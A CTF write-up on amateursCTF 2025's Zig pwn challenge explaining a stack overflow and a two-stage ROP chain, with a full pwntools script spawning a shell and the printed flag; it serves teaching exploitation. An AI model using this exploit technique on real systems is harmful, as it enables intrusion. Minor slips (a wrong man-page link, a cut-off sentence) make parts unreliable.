---
title: "Rewrite It In Zig (amateursCTF 2025)"
summary: "Medium Pwn Challenge - BOF in Zig + ROPchains"
description: "Medium Pwn Challenge - BOF in Zig + ROPchains"
tags: [PWN, medium, writeup, rop, bof]
date: 2025-11-18T23:00:00-05:00
draft: false
searchHidden: false
ShowToc: true
TocOpen: true
hidemeta: false
# weight: 1
---

## Description

Sometimes rust is just a little too safe for me.

Given file: [rewrite-it-zig.tar.gz](/amateursctf-rewrite-it-in-zig/rewrite-it-zig.tar.gz)

---

## Writeup

### Initial Analysis

This challenge is written in [Zig](https://ziglang.org/) and the given source code is:

```zig {linenos=true}
const std = @import("std");
const print = std.debug.print;

pub fn main() void {
    print("you can never have too much zig pwn.\n", .{});

    var backing: [0x100]u8 = undefined;
    var buf: []u8 = &backing;
    buf.len = 0x1000;
    _ = std.io.getStdIn().read(buf) catch {};
}
```

We can see 0x100 or 256 bytes are being allocated on the stack however buffer length is set to 0x1000 (4096 bytes). This allows user to input 4096 bytes into a 256-byte buffer.

![name](/amateursctf-rewrite-it-in-zig/2025-11-17-233231.png#center)
Checksec reveals that we have NX enabled so the stack is non-executable. No injecting shellcode here, instead we have to use Return-Oriented-Programming (ROP). PIE being disabled makes everything easier as our ROP gadgets and BSS data segment will be at a constant address. We have to verify if the stack canary actually exists since Zig binaries handle stack protection differently than C and also bof might bypass the canary depending on the stack layout (we'll come back to this).

### Finding Offset
Lets how many bytes we have to send before we hit the RSP and the return address:
- `pwndbg chal`
- `cyclic 500` (copy this)
- Run the binary `r` then pass the cyclic pattern
- Check what RSP is (the last thing that was on the stack causing the seg fault)
- `cyclic -o uaaaaaab` returns offset at **360**
![name](/amateursctf-rewrite-it-in-zig/2025-11-21-163553.png#center)

### ROP Chain Strategy
The goal is to call `execve("/bin/sh", 0, 0)` ([execve() man page](https://man7.org/linux/man-pages/man2/execve.2.html)) and get a shell so it would've been nice if we had the string "/bin/sh" somewhere in the binary (we don't)  which we could just call here after our padding and get shell. Looking for said string, `strings | grep '/bin/sh'` doesn't return anything 😔

So now we need to find some [ROP Gadgets](https://ctf101.org/binary-exploitation/return-oriented-programming/) (small and useful snippets of assembly that already exist in the binary) and manipulate them in a way that first we read "/bin/sh" from our input into a writable memory location and then call that address to spawn a shell. The process of sequentially executing these gadgets, for an exploit is called **ROP Chaining**.

#### Stage 1: reading to write? yes.
So we first need to call the `read(0, .bss, 8)` syscall to read the 8 byte string "bin/sh" from our input into a writable memory section (.bss)
([read() man page](https://man7.org/linux/man-pages/man2/execve.2.html))
#### Stage 2: spawn shell
Now we can call `execve(.bss, 0, 0)` to spawn a shell (.bss contains our "/bin/sh" string)

### Finding ROP Gadgets
There's usually a few gadgets that `pop` registers off of the stack and then call `ret` (thats where the **Return** part in **Return-Oriented-Programming** comes from). A "nice" gadget would for example be `pop rsi; ret`, no unnecessary instructions, just a `pop` and `ret`. 

A not very nice gadget however.. we will see in a second.

Running `ropper --file chal --search "pop %"` will show us some gadgets that we can work with. Look for any nice gadgets and trry

## Solve script
Completing the script:
```py {linenos=true}
from pwn import *

elf = ELF('./chal')
context.binary = elf
context.arch = 'amd64'
context.gdb_binary = '/usr/local/bin/pwndbg'


# ROP Gadgets
pop_rax = 0x010c5cc4  # pop rax; ret
pop_rdx = 0x010cf9ec  #pop rdx; ret
pop_rsi_pop_rbp = 0x0104a153  # pop rsi; pop rbp; ret
pop_rdi_pop_rbp = 0x01050fc0  # pop rdi; pop rbp; ret
syscall = 0x01067787

padding = 360
bss = elf.bss(0x200)  # Writable memory location for /bin/sh string


# read(0, bss, 8)
stage1 = flat(
    # Set rdi = 0 (stdin)
    # 2 pops, add garbage for rbp
    pop_rdi_pop_rbp, 0, 0xdeadbeef,

    # Set rsi = bss (buffer)
    pop_rsi_pop_rbp, bss, 0xdeadbeef,

    # Set rdx = 8 (length)
    pop_rdx, 8,

    # Set rax = 0 (syscall: read)
    pop_rax, 0,

    syscall
)

# execve(bss, 0, 0)
stage2 = flat(
    # Set rdi = bss (pointer to "/bin/sh")
    pop_rdi_pop_rbp, bss, 0xdeadbeef,

    # Set rsi = 0 (argv = NULL)
    pop_rsi_pop_rbp, 0, 0xdeadbeef,

    # Set rdx = 0 (envp = NULL)
    pop_rdx, 0,

    # Set rax = 59 (syscall: execve)
    pop_rax, 59,

    syscall
)

# Build final payload
payload = flat(
    b'A' * padding,  # Fill buffer up to saved RBP
    stage1,          # ROP chain to read /bin/sh and write to bss
    stage2,          # ROP chain to execute it 
)

p = elf.process()
# p = remote('amt.rs', 27193)

p.sendafter(b'pwn.\n', payload)

# Wait for read() syscall, then send /bin/sh
sleep(0.2)
p.send(b'/bin/sh\x00')

success("Shell spawned!")
p.interactive()

```

### Flag

`amateursCTF{i_love_zig_its_my_favorite_language_and_you_will_never_escape_the_zig_pwn_ahahaha}`

---
## Personal Note
ALWAYS USE **ropper**!

I thought this challenge was harder than it actually was just because the first time I did it, **ROPgadget** couldn't find a clean syscall so I had to work with this abomination instead: `syscall; add rsp, 0x28; pop rbp; ret`

This meant I had to add 0x28 of padding on the stack and then pop rbp with another 8 bytes of garbage (48 total) to ret the syscall:

```py
syscall,      # syscall; add rsp, 0x28; pop rbp; ret
b'A' * 0x28,  # Padding for "add rsp, 0x28"
0xdeadbeef,   # Fake rbp for "pop rbp"
```

I thought I was a genius for getting that to work 😔